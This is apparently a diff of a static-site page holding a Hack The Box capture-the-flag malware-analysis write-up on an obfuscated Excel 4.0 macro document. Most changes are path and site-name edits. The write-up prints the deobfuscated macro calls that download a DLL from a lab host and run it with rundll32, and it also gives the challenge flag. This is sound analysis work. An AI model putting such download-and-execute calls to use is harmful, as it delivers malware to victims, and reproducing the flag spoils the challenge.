@@ -4,7 +4,7 @@
   dir="ltr"
   class="scroll-smooth"
   data-default-appearance="dark"
-  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  data-auto-appearance="true"><head><script src="/bubka/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=bubka/livereload" data-no-instant defer></script>
   <meta charset="utf-8">
   
     <meta http-equiv="content-language" content="en-us">
@@ -15,8 +15,8 @@
 
   
   
-    <title>HTB-oBfsC4t10n2 &middot; Lextra hack stuff</title>
-    <meta name="title" content="HTB-oBfsC4t10n2 &middot; Lextra hack stuff">
+    <title>HTB-oBfsC4t10n2 &middot; bubka hack stuff</title>
+    <meta name="title" content="HTB-oBfsC4t10n2 &middot; bubka hack stuff">
   
 
   
@@ -26,7 +26,7 @@
   
   
   
-  <link rel="canonical" href="http://localhost:1313/writeups/htb-obfsc4t10n2/">
+  <link rel="canonical" href="http://localhost:1313/bubka/writeups/htb-obfsc4t10n2/">
   
 
   
@@ -34,8 +34,8 @@
   
 
   
-  <meta property="og:url" content="http://localhost:1313/writeups/htb-obfsc4t10n2/">
-  <meta property="og:site_name" content="Lextra hack stuff">
+  <meta property="og:url" content="http://localhost:1313/bubka/writeups/htb-obfsc4t10n2/">
+  <meta property="og:site_name" content="bubka hack stuff">
   <meta property="og:title" content="HTB-oBfsC4t10n2">
   <meta property="og:description" content="Difficulty: Hard OS: Linux Date: 2026-01-20 Description: Another Phishing document. Dig in and see if you can find what it executes.
 TL;DR # Malicious Excel 97-2003 document containing obfuscated XLM (Excel 4.0) macros. Analysis involves identifying the file format, extracting embedded macros using oletools, deobfuscating concatenated formula chains, and reconstructing the complete malicious payload to extract the flag.
@@ -104,14 +104,14 @@ Initial Analysis # I identified the file type to understand its structure. The p
   <link
     type="text/css"
     rel="stylesheet"
-    href="/css/main.bundle.min.6b395820ab321b4c24aa8173a69bca3235f876d3f10d16751c61a6f9340cb1051d8b88ad605be3ccc58d4f7cb218140d9dc97409e0c68afef4a5fc1a982ad3fd.css"
-    integrity="sha512-azlYIKsyG0wkqoFzppvKMjX4dtPxDRZ1HGGm&#43;TQMsQUdi4itYFvjzMWNT3yyGBQNncl0CeDGiv70pfwamCrT/Q==">
+    href="/bubka/css/main.bundle.min.4f40feea4c6f59a876576bf0c99d3ffd70a8847b71c25199e21b2f316a6ea95b5fce21b78684be222289fa9c04834d56e10420f50f8f476b9919b94ccc151f28.css"
+    integrity="sha512-T0D&#43;6kxvWah2V2vwyZ0//XCohHtxwlGZ4hsvMWpuqVtfziG3hoS&#43;IiKJ&#43;pwEg01W4QQg9Q&#43;PR2uZGblMzBUfKA==">
 
   
   
   <script
     type="text/javascript"
-    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    src="/bubka/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
     integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
   
   
@@ -120,7 +120,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
   
   
     
-    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+    <script src="/bubka/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
   
 
   
@@ -142,7 +142,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
       defer
       type="text/javascript"
       id="script-bundle"
-      src="/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
+      src="/bubka/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
       integrity="sha512-Z2JKNXySjSm5/hm6AaHjLAWtEynKKnEr8QRG3wxocpA9DBSyH3aJa1eloHEJQIBUFs7jiFHZBn22VViBGI41pQ=="
       data-copy="Copy"
       data-copied="Copied"></script>
@@ -151,7 +151,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
   
   
 
-<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+<script src="/bubka/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
 
 
 
@@ -162,7 +162,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
   <script
     defer
     type="text/javascript"
-    src="/js/mermaid.bundle.123b31b3c46015cee384d15cf0ef614f7ed885722a7e6f496f9b83d7b8400aef5dc2f3b9fc778649d5ba948bf957b3c67bbdf4de0033db316bbe394e2f7da794.js"
+    src="/bubka/js/mermaid.bundle.123b31b3c46015cee384d15cf0ef614f7ed885722a7e6f496f9b83d7b8400aef5dc2f3b9fc778649d5ba948bf957b3c67bbdf4de0033db316bbe394e2f7da794.js"
     integrity="sha512-Ejsxs8RgFc7jhNFc8O9hT37YhXIqfm9Jb5uD17hACu9dwvO5/HeGSdW6lIv5V7PGe7303gAz2zFrvjlOL32nlA=="></script>
 
 
@@ -207,10 +207,10 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
   
   
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
+    <link rel="apple-touch-icon" sizes="180x180" href="/bubka/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/bubka/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/bubka/favicon-16x16.png">
+    <link rel="manifest" href="/bubka/site.webmanifest">
   
 
   
@@ -223,7 +223,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
     "headline": "HTB-oBfsC4t10n2",
     
     "inLanguage": "en-us",
-    "url" : "http://localhost:1313/writeups/htb-obfsc4t10n2/",
+    "url" : "http://localhost:1313/bubka/writeups/htb-obfsc4t10n2/",
     "author" : {
       "@type": "Person",
       "name": ""
@@ -294,8 +294,8 @@ Initial Analysis # I identified the file type to understand its structure. The p
     <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
   
   
-    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
-      Lextra hack stuff
+    <a href="/bubka/" class="text-base font-medium truncate min-w-0 shrink">
+      bubka hack stuff
     </a>
   
   <div class="flex items-center ms-auto">
@@ -306,7 +306,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
       
   
     <a
-      href="/writeups/"
+      href="/bubka/writeups/"
       
       class="flex items-center bf-icon-color-hover"
       aria-label="writeups"
@@ -324,11 +324,11 @@ Initial Analysis # I identified the file type to understand its structure. The p
       
   
     <a
-      href="/"
+      href="/bubka/"
       
       class="flex items-center bf-icon-color-hover"
       aria-label="about"
-      title="Lextra hack stuff">
+      title="bubka hack stuff">
       
       
         <span class="text-base font-medium break-normal">
@@ -434,7 +434,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
     
     <div class="px-2">
       <a
-        href="/writeups/"
+        href="/bubka/writeups/"
         aria-label="writeups"
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
@@ -451,12 +451,12 @@ Initial Analysis # I identified the file type to understand its structure. The p
     
     <div class="px-2">
       <a
-        href="/"
+        href="/bubka/"
         aria-label="about"
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
         
-        <span title="Lextra hack stuff" class="text-2xl font-bold tracking-tight">
+        <span title="bubka hack stuff" class="text-2xl font-bold tracking-tight">
           about
         </span>
         
@@ -579,7 +579,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
         
           
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/forensics/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/forensics/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -589,7 +589,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/malware-analysis/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/malware-analysis/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -599,7 +599,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/excel/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/excel/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -609,7 +609,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/xlm-macros/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/xlm-macros/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -619,7 +619,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/olevba/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/olevba/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -629,7 +629,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/oleid/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/oleid/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -639,7 +639,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/xlmdeobfuscator/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/xlmdeobfuscator/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -884,10 +884,10 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
     
 </h2>
 <p>I identified the file type to understand its structure. The provided file is an Excel 97-2003 document</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file oBfsC4t10n2.xls                                          
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file oBfsC4t10n2.xls                                          
 </span></span><span style="display:flex;"><span>oBfsC4t10n2.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: 0xdf, Last Saved By: 0xdf, Name of Creating Application: Microsoft Excel, Create Time/Date: Mon Mar <span style="color:#a5d6ff">23</span> 15:19:10 2020, Last Saved Time/Date: Sat Apr <span style="color:#a5d6ff">25</span> 19:43:56 2020, Security: <span style="color:#a5d6ff">0</span></span></span></code></pre></div></div>
 <p><code>oleid</code> shows no VBA macros but confirms the presence of Excel 4.0 (XLM) macros</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ oleid oBfsC4t10n2.xls 
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ oleid oBfsC4t10n2.xls 
 </span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
 </span></span><span style="display:flex;"><span>--------------------+--------------------+----------+--------------------------
 </span></span><span style="display:flex;"><span>VBA Macros          |No                  |none      |This file does not contain
@@ -909,7 +909,7 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
     
 </h2>
 <p>Using <code>olevba</code> to extract and analyze the XLM macros:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; Sheet,Reference,Formula,Value
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; Sheet,Reference,Formula,Value
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D8,<span style="color:#a5d6ff">&#34;IF(GET.WORKSPACE(42),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D9,GET.WORKSPACE(13),&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D10,GOTO<span style="color:#ff7b72;font-weight:bold">(</span>C1300<span style="color:#ff7b72;font-weight:bold">)</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
@@ -990,7 +990,7 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
     
 </h2>
 <p>To evaluate macro behavior, I used <code>xlmdeobfuscator</code> emulation</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ xlmdeobfuscator --file oBfsC4t10n2.xls
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ xlmdeobfuscator --file oBfsC4t10n2.xls
 </span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$ olevba oBfsC4t10n2.xls 
@@ -1040,16 +1040,16 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
 <ol start="3">
 <li>It attempts to create a directory structure on the C: drive.</li>
 </ol>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Kernel32&#34;</span>,<span style="color:#a5d6ff">&#34;CreateDirectoryA&#34;</span>,<span style="color:#a5d6ff">&#34;JCJ&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner&#34;</span>,<span style="color:#a5d6ff">0</span>)
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Kernel32&#34;</span>,<span style="color:#a5d6ff">&#34;CreateDirectoryA&#34;</span>,<span style="color:#a5d6ff">&#34;JCJ&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner&#34;</span>,<span style="color:#a5d6ff">0</span>)
 </span></span><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Kernel32&#34;</span>,<span style="color:#a5d6ff">&#34;CreateDirectoryA&#34;</span>,<span style="color:#a5d6ff">&#34;JCJ&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkkYKlI&#34;</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
 <ol start="4">
 <li>It downloads a DLL from a remote host using URLDownloadToFileA.</li>
 </ol>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;URLMON&#34;</span>,<span style="color:#a5d6ff">&#34;URLDownloadToFileA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCJJ&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">&#34;http://0b.htb/s.dll&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkuiQhTXx.dll&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;URLMON&#34;</span>,<span style="color:#a5d6ff">&#34;URLDownloadToFileA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCJJ&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">&#34;http://0b.htb/s.dll&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkuiQhTXx.dll&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
 <ol start="5">
 <li>It executes the downloaded DLL using rundll32.exe.</li>
 </ol>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Shell32&#34;</span>,<span style="color:#a5d6ff">&#34;ShellExecuteA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCCCJ&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">&#34;Open&#34;</span>,<span style="color:#a5d6ff">&#34;rundll32.exe&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkuiQhTXx.dll...&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Shell32&#34;</span>,<span style="color:#a5d6ff">&#34;ShellExecuteA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCCCJ&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">&#34;Open&#34;</span>,<span style="color:#a5d6ff">&#34;rundll32.exe&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkuiQhTXx.dll...&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
 
 <h2 class="relative group">Flag Reconstruction
     <div id="flag-reconstruction" class="anchor"></div>
@@ -1062,13 +1062,13 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
 </h2>
 <p>Analyzing cell R1191 reveals the flag embedded in the rundll32 command line:</p>
 <p><strong>Part 1:</strong> Cell D8 (when GET.WORKSPACE(42) = TRUE)</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; CELL:D8, FullEvaluation, [TRUE] &#34; HTB{n0w_e&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; CELL:D8, FullEvaluation, [TRUE] &#34; HTB{n0w_e&#34;</span></span></code></pre></div></div>
 <p><strong>Part 2:</strong> Hardcoded string</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;Xc3l_4.0_M4&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;Xc3l_4.0_M4&#34;</span></span></code></pre></div></div>
 <p><strong>Part 3:</strong> Cell D1023 (when Windows version ≠ 6.1)</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; CELL:D1023, FullEvaluation, [FALSE] &#34;cr0s_r_b4cK}&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; CELL:D1023, FullEvaluation, [FALSE] &#34;cr0s_r_b4cK}&#34;</span></span></code></pre></div></div>
 <p><strong>Complete flag:</strong></p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>HTB{n0w_eXc3l_4.0_M4cr0s_r_b4cK}</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>HTB{n0w_eXc3l_4.0_M4cr0s_r_b4cK}</span></span></code></pre></div></div>
 
 <h2 class="relative group">Attack Flow
     <div id="attack-flow" class="anchor"></div>
@@ -1142,54 +1142,16 @@ graph TD
         
         <script
           type="text/javascript"
-          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          src="/bubka/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_writeups/HTB-oBfsC4t10n2/index.md"
-          data-oid-likes="likes_writeups/HTB-oBfsC4t10n2/index.md"></script>
+          data-oid="views_writeups\HTB-oBfsC4t10n2\index.md"
+          data-oid-likes="likes_writeups\HTB-oBfsC4t10n2\index.md"></script>
       
     </section>
 
     
     <footer class="pt-8 max-w-prose print:hidden">
       
-  
-    
-    
-    
-      
-      
-    
-    <div class="pt-8">
-      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
-      <div class="flex justify-between pt-3">
-        <span class="flex flex-col">
-          
-            <a
-              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
-              href="/writeups/htb-hubbub/">
-              <span class="leading-6">
-                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HTB-Hubbub
-              </span>
-            </a>
-            
-          
-        </span>
-        <span class="flex flex-col items-end">
-          
-            <a
-              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
-              href="/writeups/htb-conversor/">
-              <span class="leading-6">
-                HTB-Conversor&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
-              </span>
-            </a>
-            
-          
-        </span>
-      </div>
-    </div>
-  
-
 
       
     </footer>
@@ -1242,7 +1204,7 @@ graph TD
   
   <script
     type="text/javascript"
-    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    src="/bubka/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
     integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
   
   
@@ -1250,7 +1212,7 @@ graph TD
 <div
   id="search-wrapper"
   class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
-  data-url="http://localhost:1313/">
+  data-url="http://localhost:1313/bubka/">
   <div
     id="search-modal"
     class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
